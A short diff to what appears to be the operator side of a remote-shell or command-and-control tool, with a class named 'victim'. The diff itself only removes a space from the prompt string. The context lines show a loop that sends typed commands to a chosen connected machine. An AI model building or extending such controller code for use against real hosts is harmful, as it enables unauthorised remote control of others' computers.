@@ -52,7 +52,7 @@ class victim:
         conn = connections[int(args)-1]
         while True:
             try:
-                cmd = input(f'shell @{connections.index(conn)+1} # ').strip()
+                cmd = input(f'shell@{connections.index(conn)+1} # ').strip()
                 conn.send(cmd.encode())
                 args = cmd.split(' ')
                 if cmd == 'home':
